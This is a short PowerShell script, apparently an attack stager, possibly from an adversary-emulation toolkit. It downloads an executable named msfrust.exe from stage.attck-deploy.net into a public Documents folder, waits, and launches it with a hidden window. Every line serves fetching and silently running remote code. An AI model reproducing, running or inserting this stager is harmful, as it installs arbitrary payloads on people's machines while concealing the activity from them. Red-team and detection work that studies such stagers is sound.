$client = New-Object System.Net.WebClient
$client.Headers.Add('User-Agent', 'Stage (https://stage.attck-deploy.net/msfrust.exe)')
$filePath = "C:\Users\public\Documents\msfrust.exe" # Change this to your desired output directory and file name
$url = "https://stage.attck-deploy.net/msfrust.exe"
$client.DownloadFile($url, $filePath)

# Wait for the file to finish downloading before executing it
Start-Sleep -Seconds 10

# Start the process with no window in runtime
Start-Process -FilePath $filePath -WindowStyle Hidden